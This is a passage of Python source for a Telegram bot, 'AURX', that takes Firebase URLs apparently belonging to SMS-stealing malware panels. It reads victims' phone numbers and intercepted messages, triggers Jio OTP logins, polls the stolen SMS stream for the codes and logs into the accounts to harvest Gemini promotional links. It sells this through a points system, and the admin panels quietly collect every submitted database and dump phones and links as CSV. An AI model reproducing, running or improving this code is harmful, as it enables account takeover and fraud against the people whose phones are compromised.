    def _confirm_and_run(self, uid: int, chat_id: int, message_id: int,
                         cb_id: str, key: str):
        now = time.time()
        last = self.cooldowns.get(uid, 0)
        if now - last < COOLDOWN_BETWEEN_RUNS:
            wait = int(COOLDOWN_BETWEEN_RUNS - (now - last))
            self.tg.answer_callback(cb_id, f"⏳ Wait {wait}s.", alert=True)
            return

        fbs = self.db.user_firebases(uid)
        if not fbs:
            self.tg.answer_callback(cb_id, "🔥 No Firebase saved.", alert=True)
            return

        selected: list[str] = []
        if key == "all":
            selected = list(fbs)
        else:
            try:
                idx = int(key)
                selected = [fbs[idx]]
            except (ValueError, IndexError):
                self.tg.answer_callback(cb_id, "❌ Invalid selection.", alert=True)
                return

        self.cooldowns[uid] = now
        self.tg.answer_callback(cb_id,
                                f"🚀 Running {len(selected)} Firebase(s)…",
                                alert=False)

        text = self._frame(0, f"Preparing {len(selected)} Firebase(s)")
        self.tg.edit_message(chat_id, message_id, text)
        threading.Thread(target=self._run_automation,
                         args=(uid, chat_id, message_id, selected),
                         daemon=True).start()

    # ---------- Firebase management ----------
    def _send_fb_menu(self, chat_id: int, uid: int, *, edit: Optional[int] = None):
        fbs = self.db.user_firebases(uid)
        text = (
            f"╔══════════════════════════════════╗\n"
            f"║       <b>🔥 MANAGE FIREBASE</b>       ║\n"
            f"╚══════════════════════════════════╝\n\n"
            f"🔥 <b>Saved Firebases:</b> <code>{len(fbs)}</code>\n\n"
            f"Add single or bulk. Accepts raw URLs and <code>?s=</code> panel links."
        )
        markup = kb_fb_menu()
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=markup)
        else:
            self.tg.send_message(chat_id, text, reply_markup=markup)

    def _prompt_fb_add(self, uid: int, chat_id: int):
        self._state(uid).action = "fb_add"
        self.tg.send_message(
            chat_id,
            "📥 <b>Add Firebase</b>\n\n"
            "Paste one or more Firebase URLs.\n"
            "• One per line, or space/comma separated\n"
            "• Raw Firebase or <code>?s=</code> panel links\n\n"
            "Send /cancel to abort.")

    def _handle_fb_add(self, uid: int, chat_id: int, text: str, from_user: dict):
        st = self._state(uid)
        links = extract_firebase_links_from_text(text)
        if not links:
            self.tg.send_message(chat_id, "❌ No valid Firebase URLs found.\nPaste again or /cancel.")
            return
        added = 0
        for url in links:
            if self.db.add_user_firebase(uid, url):
                added += 1

        new_global = self.fb_registry.add_many(
            links, user_id=uid,
            first_name=from_user.get("first_name") or "")

        if new_global:
            try:
                notify = (
                    f"🆕 <b>New Firebase{'s' if len(new_global)>1 else ''} Found</b>\n\n"
                    f"👤 <b>{esc(from_user.get('first_name') or '')}</b> "
                    f"(<code>{uid}</code>)\n"
                    f"🔢 <code>{len(new_global)}</code>\n\n"
                    + "\n".join(f"• <code>{esc(u)}</code>" for u in new_global[:10]))
                if len(new_global) > 10:
                    notify += f"\n<i>…+{len(new_global)-10} more</i>"
                self.tg.send_message(self.admin_id, notify)
            except Exception:
                pass

        st.action = None
        msg = (
            f"✅ <b>Firebase saved</b>\n\n"
            f"• Added: <code>{added}</code>\n"
            f"• Already had: <code>{len(links) - added}</code>\n"
            f"• New global entries: <code>{len(new_global)}</code>\n\n"
            f"Total saved for you: <code>{len(self.db.user_firebases(uid))}</code>")
        self.tg.send_message(chat_id, msg, reply_markup=kb_fb_menu())

    def _send_fb_list(self, chat_id: int, uid: int, *, edit: Optional[int] = None):
        fbs = self.db.user_firebases(uid)
        if not fbs:
            text = "📭 <b>No Firebase saved yet.</b>"
        else:
            body = "\n".join(f"{i+1}. <code>{esc(u)}</code>" for i, u in enumerate(fbs[:40]))
            extra = f"\n\n<i>…and {len(fbs)-40} more</i>" if len(fbs) > 40 else ""
            text = f"🔥 <b>Your Firebases ({len(fbs)})</b>\n\n{body}{extra}"
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=kb_fb_menu())
        else:
            self.tg.send_message(chat_id, text, reply_markup=kb_fb_menu())

    # ---------- automation ----------
    def _frame(self, i: int, label: str) -> str:
        frame = LOADING_FRAMES[i % len(LOADING_FRAMES)]
        bar = PROGRESS_BLOCKS[min(i, len(PROGRESS_BLOCKS) - 1)]
        return (
            f"╔══════════════════════════════════╗\n"
            f"║     <b>⚡ {BRAND} AUTOMATION</b>     ║\n"
            f"╚══════════════════════════════════╝\n\n"
            f"<code>{bar}</code>\n"
            f"  {frame} <b>{label}...</b>\n\n"
            f"<i>Please wait…</i>"
        )

    def _run_automation(self, uid: int, chat_id: int, message_id: int,
                        firebase_urls: list[str]):
        stop = threading.Event()
        state = {"label": "Starting", "progress": ""}

        def animator():
            i = 0
            while not stop.is_set():
                try:
                    extra = f"\n<i>{esc(state['progress'])}</i>" if state["progress"] else ""
                    self.tg.edit_message(chat_id, message_id,
                                         self._frame(i, state["label"]) + extra)
                except Exception:
                    pass
                i += 1
                stop.wait(1.5)

        threading.Thread(target=animator, daemon=True).start()

        try:
            first_name = ""
            urow = self.db.get_user(uid)
            if urow:
                first_name = urow["first_name"] or ""

            report = self._collect_all_links(uid, first_name,
                                             firebase_urls, state)
            stop.set()
            time.sleep(0.3)

            total_links = sum(len(fb["links"]) for fb in report["firebases"])
            fresh_count = sum(1 for fb in report["firebases"]
                              for it in fb["links"] if it["status"] == "fresh")
            used_count = sum(1 for fb in report["firebases"]
                             for it in fb["links"] if it["status"] == "used")
            unk_count = sum(1 for fb in report["firebases"]
                            for it in fb["links"] if it["status"] == "unknown")

            self.db.add_points(uid, -1)
            self.db.log_run(
                uid,
                f"ok {total_links} links "
                f"(fresh={fresh_count}, used={used_count}, unknown={unk_count})")

            header = (
                f"╔══════════════════════════════════╗\n"
                f"║      <b>✅ AUTOMATION DONE</b>       ║\n"
                f"╚══════════════════════════════════╝\n\n"
                f"🌐 <b>Firebases scanned:</b> <code>{len(firebase_urls)}</code>\n"
                f"🔗 <b>Total links:</b> <code>{total_links}</code>\n"
                f"🟢 <b>Fresh:</b> <code>{fresh_count}</code>   "
                f"🔴 <b>Used:</b> <code>{used_count}</code>   "
                f"⚪ <b>Unknown:</b> <code>{unk_count}</code>\n\n"
            )
            for fb in report["firebases"]:
                short = short_fb(fb["url"], 42)
                header += (f"• <code>{esc(short)}</code>\n"
                           f"   📱 devices: {fb['devices']} | "
                           f"☎️ phones: {fb['phones']} | "
                           f"🔐 logins: {fb['logins_ok']} | "
                           f"🔗 links: {len(fb['links'])}\n")
            header += "\n<i>See links.txt for full details. 1 point deducted.</i>"

            self.tg.edit_message(chat_id, message_id, header,
                                 reply_markup=kb_main(self._is_admin(uid)))

            content = self._build_links_txt(uid, report)
            self.tg.send_document(
                chat_id, "links.txt", content,
                caption=(f"📄 <b>links.txt</b>\n"
                         f"{total_links} link(s) across "
                         f"{len(firebase_urls)} Firebase(s). "
                         f"🟢 {fresh_count} fresh, 🔴 {used_count} used, "
                         f"⚪ {unk_count} unknown."))
        except Exception as e:
            stop.set()
            time.sleep(0.2)
            self.db.log_run(uid, f"exception: {e}")
            traceback.print_exc()
            self.tg.edit_message(
                chat_id, message_id,
                f"❌ <b>Error:</b>\n<pre>{esc(str(e)[:1500])}</pre>",
                reply_markup=kb_main(self._is_admin(uid)))

    def _build_links_txt(self, uid: int, report: dict) -> bytes:
        lines: list[str] = []
        lines.append("# ═══════════════════════════════════════════════════════════")
        lines.append("# AURX GEMINI LINK REPORT")
        lines.append(f"# Generated : {datetime.now(timezone.utc).isoformat()}")
        lines.append(f"# User ID   : {uid}")
        lines.append(f"# Firebases : {len(report['firebases'])}")
        total = sum(len(fb["links"]) for fb in report["firebases"])
        fresh_n = sum(1 for fb in report["firebases"]
                      for it in fb["links"] if it["status"] == "fresh")
        used_n = sum(1 for fb in report["firebases"]
                     for it in fb["links"] if it["status"] == "used")
        unk_n = sum(1 for fb in report["firebases"]
                    for it in fb["links"] if it["status"] == "unknown")
        lines.append(f"# Total      : {total}")
        lines.append(f"#   FRESH    : {fresh_n}")
        lines.append(f"#   USED     : {used_n}")
        lines.append(f"#   UNKNOWN  : {unk_n}")
        lines.append("# ═══════════════════════════════════════════════════════════")
        lines.append("")

        for fb in report["firebases"]:
            lines.append("─" * 70)
            lines.append(f"FIREBASE : {fb['url']}")
            lines.append(f"Devices  : {fb['devices']}  "
                         f"(phones {fb['phones']}, online {fb['online']})")
            lines.append(f"Logins   : {fb['logins_ok']} succeeded")
            lines.append(f"Links    : {len(fb['links'])}")
            lines.append("─" * 70)

            if not fb["links"]:
                lines.append("  (no links found or generated)")
                lines.append("")
                continue

            for item in fb["links"]:
                s = item["status"]
                if s == "fresh":
                    tag = "[🟢 FRESH   ]"
                elif s == "used":
                    tag = "[🔴 USED    ]"
                else:
                    tag = "[⚪ UNKNOWN ]"
                lines.append(f"  {tag}  ☎️ {item['phone']}")
                lines.append(f"              🔗 {item['url']}")
                if item.get("reason"):
                    lines.append(f"              📌 {item['reason']}")
                if item.get("source"):
                    lines.append(f"              🌐 {item['source']}")
                lines.append("")
            lines.append("")

        return ("\n".join(lines) + "\n").encode("utf-8")

    def _collect_all_links(self, uid: int, first_name: str,
                           firebase_urls: list[str], state: dict) -> dict:
        firebase_reports: list[dict] = []

        for fb_index, fb in enumerate(firebase_urls, 1):
            state["label"] = f"Firebase {fb_index}/{len(firebase_urls)}"
            state["progress"] = f"Scanning {short_fb(fb, 40)}"

            clients, messages = fetch_firebase_snapshot(fb)

            devices: list[dict] = []
            seen_phones: set[str] = set()
            for cid, cdata in clients.items():
                dev_msgs = messages.get(str(cid), {}) if isinstance(messages, dict) else {}
                phone = _extract_phone_from_messages(dev_msgs)
                if not phone or phone in seen_phones:
                    continue
                seen_phones.add(phone)
                devices.append({
                    "client_id": str(cid),
                    "phone": phone,
                    "online": _is_online_device(cdata),
                    "messages": dev_msgs if isinstance(dev_msgs, dict) else {},
                })

            history_links: list[str] = []
            seen_hist: set[str] = set()
            for dev_msgs in messages.values():
                if not isinstance(dev_msgs, dict):
                    continue
                for msg in dev_msgs.values():
                    if not isinstance(msg, dict):
                        continue
                    body = str(msg.get("body") or msg.get("message")
                               or msg.get("text") or msg.get("sms") or "")
                    for u in extract_activation_links(body):
                        if u not in seen_hist:
                            seen_hist.add(u)
                            history_links.append(u)

            online_count = sum(1 for d in devices if d["online"])
            print(f"[aurx] FB {fb}: {len(devices)} devices "
                  f"({online_count} online), "
                  f"{len(history_links)} history links", file=sys.stderr)

            state["progress"] = (f"Logging in {len(devices)} number(s) • "
                                 f"{short_fb(fb, 30)}")
            results: list[dict] = []

            def process_device(idx: int, d: dict) -> dict:
                phone = d["phone"]
                client_id = d["client_id"]
                try:
                    jio = JioAuthClient(timeout=JIO_HTTP_TIMEOUT)
                    trigger_ms = int(time.time() * 1000)
                    _retry("sendOtp", lambda: jio.send_otp(phone))
                    otp = poll_firebase_for_otp(fb, client_id, trigger_ms)
                    if not otp:
                        return {"phone": phone, "link": None,
                                "error": "OTP timeout"}
                    _retry("validateOtp", lambda: jio.validate_otp(otp))
                    result = jio.post_login_flow()
                    google = result.get("googleAiResult") or {}
                    link = google.get("redirectionURL") if isinstance(google, dict) else None
                    if isinstance(link, str) and link.startswith(("http://", "https://")):
                        return {"phone": phone, "link": link, "error": None}
                    return {"phone": phone, "link": None,
                            "error": "no redirectionURL"}
                except Exception as e:
                    return {"phone": phone, "link": None, "error": str(e)}

            with concurrent.futures.ThreadPoolExecutor(
                    max_workers=min(DEVICE_WORKERS, max(1, len(devices)))) as ex:
                futures = [ex.submit(process_device, i, d)
                           for i, d in enumerate(devices, 1)]
                for fut in concurrent.futures.as_completed(futures):
                    try:
                        results.append(fut.result())
                    except Exception as e:
                        results.append({"phone": "?", "link": None,
                                        "error": str(e)})

            logins_ok = sum(1 for r in results if r.get("link"))

            # 1. Collect all candidate URLs (login + history), dedupe
            candidates: list[dict] = []
            seen_urls: set[str] = set()
            for r in results:
                if r.get("link") and r["link"] not in seen_urls:
                    seen_urls.add(r["link"])
                    candidates.append({
                        "phone": r["phone"],
                        "url": r["link"],
                        "source": "Jio login flow",
                    })
            for u in history_links:
                if u not in seen_urls:
                    seen_urls.add(u)
                    candidates.append({
                        "phone": "(from Firebase history)",
                        "url": u,
                        "source": "Firebase message history",
                    })

            # 2. Check freshness of each link in parallel
            state["progress"] = (f"Testing {len(candidates)} link(s) • "
                                 f"{short_fb(fb, 30)}")
            check_results = check_gemini_links_parallel(
                [c["url"] for c in candidates],
                max_workers=GEMINI_CHECK_WORKERS)

            # 3. Assemble report + write history
            fb_links: list[dict] = []
            for c in candidates:
                r = check_results.get(c["url"], {"status": "unknown", "reason": ""})
                status = r["status"]
                reason = r["reason"]
                fb_links.append({
                    "phone": c["phone"],
                    "url": c["url"],
                    "status": status,
                    "reason": reason,
                    "source": c["source"],
                })
                self.history_store.record(
                    uid, first_name,
                    firebase=fb, phone=c["phone"],
                    url=c["url"], status=status, reason=reason)

            firebase_reports.append({
                "url": fb,
                "devices": len(devices),
                "online": online_count,
                "phones": len(seen_phones),
                "logins_ok": logins_ok,
                "links": fb_links,
            })

        return {"firebases": firebase_reports}

    # ---------- admin panels ----------
    def _send_admin_panel(self, chat_id: int, uid: int, *, edit: Optional[int] = None):
        stats = self.db.stats()
        text = admin_text(stats, self.fb_registry.count(),
                          self.fb_registry.new_count(),
                          self.history_store.count_all())
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=kb_admin())
        else:
            self.tg.send_message(chat_id, text, reply_markup=kb_admin())

    def _send_admin_users(self, chat_id: int, uid: int, page: int, *, edit: Optional[int] = None):
        rows = self.db.all_users()
        per = 10
        start = page * per
        chunk = rows[start:start + per]
        pages = max(1, (len(rows) + per - 1) // per)
        lines = [
            "╔══════════════════════════════════╗",
            f"║         <b>👥 USERS ({len(rows)})</b>          ║",
            "╚══════════════════════════════════╝",
            f"<i>Page {page + 1}/{pages}</i>", "",
        ]
        now = time.time()
        for r in chunk:
            left = max(0, int(float(r["access_until"] or 0) - now))
            state = "🟢" if left > 0 else "🔴"
            name = r["first_name"] or r["username"] or "-"
            lines.append(
                f"{state} <code>{r['user_id']}</code> — {esc(name)}\n"
                f"   💎{r['points']} | 🎁{r['refer_count']} | 🔑{fmt_duration(left)}")
        nav = []
        if page > 0:
            nav.append({"text": "⬅️ Prev", "callback_data": f"admin_users:{page-1}"})
        if page + 1 < pages:
            nav.append({"text": "Next ➡️", "callback_data": f"admin_users:{page+1}"})
        rows_kb = [nav] if nav else []
        rows_kb.append([{"text": "🔙 Back", "callback_data": "admin"}])
        markup = {"inline_keyboard": rows_kb}
        text = "\n".join(lines)
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=markup)
        else:
            self.tg.send_message(chat_id, text, reply_markup=markup)

    def _send_admin_top(self, chat_id: int, uid: int, *, edit: Optional[int] = None):
        rows = self.db.top_referrers(20)
        text = top_text(rows)
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=kb_admin())
        else:
            self.tg.send_message(chat_id, text, reply_markup=kb_admin())

    def _send_admin_fb_list(self, chat_id: int, uid: int, *, edit: Optional[int] = None):
        urls = self.fb_registry.all()
        if not urls:
            text = "🌐 <b>No Firebase URLs registered yet.</b>"
        else:
            body = "\n".join(f"{i+1}. <code>{esc(u)}</code>" for i, u in enumerate(urls[:60]))
            more = f"\n\n<i>…and {len(urls)-60} more</i>" if len(urls) > 60 else ""
            text = (f"🌐 <b>All Firebase URLs ({len(urls)})</b>\n"
                    f"<i>File: {esc(FIREBASE_LIST_FILE)}</i>\n\n{body}{more}")
        try:
            content = ("\n".join(urls) + "\n").encode("utf-8") if urls else b"(empty)\n"
            self.tg.send_document(chat_id, "firebase_all.txt", content,
                                  caption=f"🌐 firebase_all.txt ({len(urls)})")
        except Exception:
            pass
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=kb_admin())
        else:
            self.tg.send_message(chat_id, text, reply_markup=kb_admin())

    def _send_admin_fb_new(self, chat_id: int, uid: int, *, edit: Optional[int] = None):
        items = self.fb_registry.recent_new(limit=40)
        total = self.fb_registry.new_count()
        if not items:
            text = "🆕 <b>No new Firebases found yet.</b>"
        else:
            lines = [
                "╔══════════════════════════════════╗",
                f"║    <b>🆕 NEW FIREBASES ({total})</b>     ║",
                "╚══════════════════════════════════╝", "",
                "<i>Newest first</i>", "",
            ]
            for it in items:
                when = datetime.fromtimestamp(it["ts"], tz=timezone.utc)\
                    .strftime("%Y-%m-%d %H:%M")
                lines.append(
                    f"• <code>{esc(it['url'])}</code>\n"
                    f"   👤 <b>{esc(it['first_name'] or '-')}</b> "
                    f"(<code>{it['user_id']}</code>)  🕒 {when}")
            text = "\n".join(lines)
        try:
            if os.path.exists(FIREBASE_NEW_FILE):
                with open(FIREBASE_NEW_FILE, "rb") as f:
                    content = f.read()
            else:
                content = b"(empty)\n"
            self.tg.send_document(chat_id, "firebase_new.txt", content,
                                  caption=f"🆕 firebase_new.txt ({total} entries)")
        except Exception:
            pass
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=kb_admin())
        else:
            self.tg.send_message(chat_id, text, reply_markup=kb_admin())

    def _send_admin_gemini_users(self, chat_id: int, uid: int, *, edit: Optional[int] = None):
        total = self.history_store.count_all()
        rows = self.db.all_history(limit=40)
        if not rows:
            text = "📄 <b>No links extracted by users yet.</b>"
        else:
            lines = [
                "╔══════════════════════════════════╗",
                f"║   <b>📄 GEMINI USERS ({total})</b>      ║",
                "╚══════════════════════════════════╝", "",
                "<i>All user extractions (newest 40 shown)</i>", "",
            ]
            for r in rows:
                when = datetime.fromtimestamp(r["added_at"], tz=timezone.utc)\
                    .strftime("%m-%d %H:%M")
                url = r["url"]
                url_short = url if len(url) <= 68 else url[:65] + "…"
                lines.append(
                    f"{status_emoji(r['status'])} <b>{status_label(r['status'])}</b>  "
                    f"<code>{esc(url_short)}</code>\n"
                    f"   👤 <code>{r['user_id']}</code>  ☎️ {esc(r['phone'] or '-')}  "
                    f"🔥 <code>{esc(short_fb(r['firebase'] or '-', 30))}</code>\n"
                    f"   🕒 {when}")
            text = "\n".join(lines)
        try:
            if os.path.exists(GEMINI_USERS_FILE):
                with open(GEMINI_USERS_FILE, "rb") as f:
                    content = f.read()
            else:
                content = b"(empty)\n"
            self.tg.send_document(chat_id, "gemini_users.txt", content,
                                  caption=f"📄 gemini_users.txt ({total} lines)")
        except Exception:
            pass
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=kb_admin())
        else:
            self.tg.send_message(chat_id, text, reply_markup=kb_admin())

    def _send_admin_all_history(self, chat_id: int, uid: int, *, edit: Optional[int] = None):
        total = self.history_store.count_all()
        rows = self.db.all_history(limit=40)
        if not rows:
            text = "📜 <b>No history yet.</b>"
        else:
            lines = [
                "╔══════════════════════════════════╗",
                f"║     <b>📜 ALL HISTORY ({total})</b>     ║",
                "╚══════════════════════════════════╝", "",
            ]
            for r in rows:
                when = datetime.fromtimestamp(r["added_at"], tz=timezone.utc)\
                    .strftime("%m-%d %H:%M")
                url = r["url"]
                url_short = url if len(url) <= 68 else url[:65] + "…"
                lines.append(
                    f"{status_emoji(r['status'])} <code>{esc(url_short)}</code>\n"
                    f"   👤 <code>{r['user_id']}</code> | ☎️ {esc(r['phone'] or '-')} "
                    f"| 🕒 {when}")
            text = "\n".join(lines)
        # Attach CSV-style file for full dump
        try:
            rows_all = self.db.all_history(limit=5000)
            buf = ["user_id,firebase,phone,status,url,added_at"]
            for r in rows_all:
                buf.append(
                    f"{r['user_id']},{(r['firebase'] or '').replace(',', ' ')},"
                    f"{r['phone'] or ''},{r['status']},"
                    f"{r['url']},{r['added_at']}")
            content = ("\n".join(buf) + "\n").encode("utf-8")
            self.tg.send_document(chat_id, "all_history.csv", content,
                                  caption=f"📜 All history CSV ({len(rows_all)} rows)")
        except Exception:
            pass
        if edit:
            self.tg.edit_message(chat_id, edit, text, reply_markup=kb_admin())
        else:
            self.tg.send_message(chat_id, text, reply_markup=kb_admin())

    def _prompt_admin_point(self, uid: int, chat_id: int, action: str):
        self._state(uid).action = action
        verb = "add" if action == "add" else "subtract"
        self.tg.send_message(
            chat_id,
            f"📝 <b>Admin — {verb.title()} Points</b>\n\n"
            f"Send: <code>USER_ID POINTS</code>\n"
            f"Example: <code>123456789 5</code>\n\n/cancel to abort.")

    def _prompt_broadcast(self, uid: int, chat_id: int):
        self._state(uid).action = "broadcast"
        self.tg.send_message(chat_id, "📢 <b>Broadcast</b>\n\nSend the message.\n/cancel to abort.")

    def _handle_admin_input(self, uid: int, chat_id: int, text: str):
        st = self._state(uid)
        action = st.action
        if action in ("add", "sub"):
            parts = text.split()
            if len(parts) != 2 or not all(p.lstrip("-").isdigit() for p in parts):
                self.tg.send_message(chat_id, "❌ Use: <code>USER_ID POINTS</code>")
                return
            target_id, points = int(parts[0]), int(parts[1])
            if points <= 0:
                self.tg.send_message(chat_id, "❌ Points must be positive.")
                return
            target = self.db.get_user(target_id)
            if not target:
                self.tg.send_message(chat_id, f"❌ User <code>{target_id}</code> not found.")
                return
            delta = points if action == "add" else -points
            new_points = self.db.add_points(target_id, delta)
            verb = "added to" if action == "add" else "subtracted from"
            self.tg.send_message(
                chat_id,
                f"✅ <b>{points} point(s)</b> {verb} <code>{target_id}</code>.\n"
                f"💎 Balance: <code>{new_points}</code>",
                reply_markup=kb_admin())
            try:
                if delta > 0:
                    msg = (f"🎁 <b>Admin credited {points} point(s)</b>!\n"
                           f"💎 Balance: <code>{new_points}</code>")
                else:
                    msg = (f"⚠️ <b>Admin removed {points} point(s)</b>.\n"
                           f"💎 Balance: <code>{new_points}</code>")
                self.tg.send_message(target_id, msg)
            except Exception:
                pass
            st.action = None
        elif action == "broadcast":
            users = self.db.all_users()
            sent = failed = 0
            for u in users:
                try:
                    r = self.tg.send_message(u["user_id"], f"📢 <b>Broadcast</b>\n\n{esc(text)}")
                    if r.get("ok"):
                        sent += 1
                    else:
                        failed += 1
                except Exception:
                    failed += 1
                time.sleep(0.05)
            self.tg.send_message(
                chat_id,
                f"✅ <b>Broadcast done</b>\nSent: {sent}\nFailed: {failed}",
                reply_markup=kb_admin())
            st.action = None

    # ---------- main loop ----------
    def run(self):
        me = self.tg.get_me()
        if me.get("ok"):
            self.bot_username = me["result"].get("username", "AURXBot")
            print(f"[aurx] Logged in as @{self.bot_username}")
        else:
            print(f"[aurx] getMe failed: {me}")
            return
        print("[aurx] Bot started. Listening for updates...")
        while True:
            try:
                for u in self.tg.get_updates(timeout=30):
                    threading.Thread(target=self.handle_update, args=(u,), daemon=True).start()
            except KeyboardInterrupt:
                print("\n[aurx] Stopping...")
                return
            except Exception:
                traceback.print_exc()
                time.sleep(3)


# ───────────────────────────────────────────────────────────────────────
#  Entry
# ───────────────────────────────────────────────────────────────────────
def main():
    print(f"[aurx] Starting {BRAND} bot...")
    tg = Telegram(BOT_TOKEN)
    db = DB(DB_PATH)
    auth = Auth(tg, db)
    fb_registry = FirebaseRegistry(FIREBASE_LIST_FILE, FIREBASE_NEW_FILE)
    link_history = LinkHistory(LINK_HISTORY_FILE)
    history_store = HistoryStore(db, GEMINI_USERS_FILE)
    bot = AurxBot(tg, db, auth, fb_registry, link_history, history_store, ADMIN_ID)
    bot.run()


if __name__ == "__main__":
    main()